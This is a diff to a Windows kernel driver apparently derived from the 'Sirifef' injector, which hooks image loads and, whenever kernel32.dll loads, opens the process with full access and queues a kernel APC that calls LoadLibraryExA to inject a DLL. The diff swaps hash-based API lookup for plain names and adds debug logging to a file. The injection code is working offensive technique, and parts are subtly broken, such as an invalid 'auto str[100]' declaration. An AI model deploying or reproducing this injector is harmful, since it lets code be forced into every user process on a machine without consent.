@@ -6,21 +6,77 @@
 
 GET_ADDRESS Hash = { 0 };
 
-UINT32 HashString(PCHAR pcString)
-{
-	INT Counter = NULL;
-	UINT32 Hash = 0, N = 0;
-	while ((Counter = *pcString++))
-	{
-		Hash ^= ((N++ & 1) == NULL) ? ((Hash << 5) ^ Counter ^ (Hash >> 1)) :
-			(~((Hash << 9) ^ Counter ^ (Hash >> 3)));
-	}
+static HANDLE handle = NULL;
 
-	return (Hash & 0x7FFFFFFF);
+static size_t StrLen(PCSTR str)
+{
+	size_t len = 0;
+	while (*str++)
+	{
+		++len;
+	}
+	return len;
 }
 
-PVOID GetProcedureAddressByHash(PVOID ModuleBase,ULONG dwHash, ULONG Data)
+static int StrCmp(PCSTR a, PCSTR b, size_t len)
 {
+	char result = 0;
+	for (; len != 0; ++a, ++b, --len)
+	{
+		char c = *b;
+		result = *a - c;
+		if (result || c == 0)
+			break;
+	}
+	if (result < 0)
+		return -1;
+	else if (result > 0)
+		return 1;
+	else
+		return result;
+}
+
+ULONG Log(PSTR buffer)
+{
+	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
+		return STATUS_INVALID_DEVICE_STATE;
+
+	NTSTATUS ntstatus;
+	IO_STATUS_BLOCK    ioStatusBlock;
+
+	if (handle == NULL) {
+		UNICODE_STRING     uniName;
+		OBJECT_ATTRIBUTES  objAttr;
+
+		RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\mylog.txt");
+		InitializeObjectAttributes(&objAttr, &uniName,
+			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+			NULL, NULL);
+
+
+		ntstatus = ZwCreateFile(&handle,
+			FILE_WRITE_DATA | FILE_APPEND_DATA | SYNCHRONIZE,
+			&objAttr, &ioStatusBlock, NULL,
+			FILE_ATTRIBUTE_NORMAL,
+			FILE_SHARE_READ,
+			FILE_OPEN_IF,
+			FILE_SYNCHRONOUS_IO_NONALERT,
+			NULL, 0);
+	}
+	else ntstatus = STATUS_SUCCESS;
+
+	if (NT_SUCCESS(ntstatus)) {
+		ntstatus = ZwWriteFile(handle, NULL, NULL, NULL, &ioStatusBlock,
+			buffer, strlen(buffer), NULL, NULL);
+	}
+
+	return 0;
+}
+
+PVOID GetProcedureAddress(PVOID ModuleBase, PCSTR ProcName, ULONG Data)
+{
+	Log("GetProcedureAddress\r\n");
+	size_t nameSize = StrLen(ProcName) + 1;
 	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
 	if (ImageDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
 	{
@@ -35,15 +91,16 @@ PVOID GetProcedureAddressByHash(PVOID ModuleBase,ULONG dwHash, ULONG Data)
 					for (ULONG n = 0; n < ImageExport->NumberOfNames; ++n)
 					{
 						LPSTR Func = ((LPSTR)RtlOffsetToPointer(ModuleBase, AddressOfNames[n]));
-						if (HashString(Func) == dwHash)
+						if (StrCmp(ProcName, Func, nameSize) == 0)
 						{
+							Log("FOUND: ");
+							Log(ProcName);
+							Log("\r\n");
 							PULONG AddressOfFunctions = ((PULONG)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfFunctions));
 							PUSHORT AddressOfOrdinals = ((PUSHORT)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfNameOrdinals));
 							return ((PVOID)RtlOffsetToPointer(ModuleBase, AddressOfFunctions[AddressOfOrdinals[n]]));
-
 						}
 					}
-
 				}
 			}
 		}
@@ -51,12 +108,12 @@ PVOID GetProcedureAddressByHash(PVOID ModuleBase,ULONG dwHash, ULONG Data)
 	return NULL;
 }
 
-PVOID ResolveDynamicImport(PVOID ModuleBase, ULONG Hash)
+PVOID ResolveDynamicImport(PVOID ModuleBase, PCSTR ProcName)
 {
-	return GetProcedureAddressByHash(ModuleBase, Hash,0);
+	return GetProcedureAddress(ModuleBase, ProcName, 0);
 }
 
-VOID NTAPI APCKernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID *SysArg1, PVOID *SysArg2, PVOID *Context)
+VOID NTAPI APCKernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* SysArg1, PVOID* SysArg2, PVOID* Context)
 {
 	ExFreePool(Apc);
 	return;
@@ -64,6 +121,7 @@ VOID NTAPI APCKernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID *S
 
 NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
 {
+	Log("DllInject\r\n");
 	HANDLE hProcess;
 	OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
 	CLIENT_ID cidprocess = { 0 };
@@ -75,7 +133,8 @@ NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOO
 	cidprocess.UniqueThread = 0;
 	if (NT_SUCCESS(ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cidprocess)))
 	{
-		if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &pvMemory, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
+		auto result = ZwAllocateVirtualMemory(hProcess, &pvMemory, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (NT_SUCCESS(result))
 		{
 			KAPC_STATE KasState;
 			PKAPC Apc;
@@ -90,21 +149,36 @@ NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOO
 				KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
 				return STATUS_SUCCESS;
 			}
+			else
+				Log("ExAllocatePool Failed!");
+		}
+		else
+		{
+			auto str[100];
+			sprintf(str, "ZwAllocateVirtualMemory Failed [%d]", result);
+			Log(str);
+			Log("\r\n");
 		}
 		ZwClose(hProcess);
 	}
+	else
+		Log("Failed to Open Process!");
 
 	return STATUS_NO_MEMORY;
 }
 
 VOID SirifefWorkerRoutine(PVOID Context)
 {
-	DllInject(((PSIRIFEF_INJECTION_DATA)Context)->ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)->Process, ((PSIRIFEF_INJECTION_DATA)Context)->Ethread, FALSE);
+	auto result = DllInject(((PSIRIFEF_INJECTION_DATA)Context)->ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)->Process, ((PSIRIFEF_INJECTION_DATA)Context)->Ethread, FALSE);
 	KeSetEvent(&((PSIRIFEF_INJECTION_DATA)Context)->Event, (KPRIORITY)0, FALSE);
+
+	if (NT_SUCCESS(result))
+		Log("Successful Injection!");
+
 	return;
 }
 
-VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *SystemArgument1, PVOID *SystemArgument2, PVOID* Context)
+VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* SystemArgument1, PVOID* SystemArgument2, PVOID* Context)
 {
 	SIRIFEF_INJECTION_DATA Sf;
 
@@ -118,13 +192,22 @@ VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID 
 	ExQueueWorkItem(&Sf.WorkItem, DelayedWorkQueue);
 	KeWaitForSingleObject(&Sf.Event, Executive, KernelMode, TRUE, 0);
 	return;
-	
+
 }
 
-VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName,IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
+VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
 {
 	if (ImageName != NULL)
 	{
+		ANSI_STRING ansiStr;
+		RtlInitAnsiString(&ansiStr, NULL);
+		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiStr, ImageName, TRUE)))
+		{
+			Log("Image Name ");
+			Log(ansiStr.Buffer);
+			Log("\r\n");
+		}
+
 		WCHAR kernel32Mask[] = L"*\\KERNEL32.DLL";
 		UNICODE_STRING kernel32us;
 
@@ -132,11 +215,11 @@ VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName,IN HANDLE ProcessId, IN
 		if (FsRtlIsNameInExpression(&kernel32us, ImageName, TRUE, NULL))
 		{
 			PKAPC Apc;
-			
+
 			if (Hash.Kernel32dll == 0)
 			{
 				Hash.Kernel32dll = (PVOID)pImageInfo->ImageBase;
-				Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, SIRIFEF_LOADLIBRARYEXA_ADDRESS);
+				Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, "LoadLibraryExA");
 			}
 
 			Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
@@ -154,11 +237,15 @@ VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName,IN HANDLE ProcessId, IN
 
 VOID Unload(IN PDRIVER_OBJECT pDriverobject)
 {
+	Log("Unload\r\n");
 	PsRemoveLoadImageNotifyRoutine(&LoadImageNotifyRoutine);
+	if (handle != NULL)
+		ZwClose(handle);
 }
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverobject, IN PUNICODE_STRING pRegister)
 {
+	Log("DriverEntry\r\n");
 	NTSTATUS st;
 
 	PsSetLoadImageNotifyRoutine(&LoadImageNotifyRoutine);
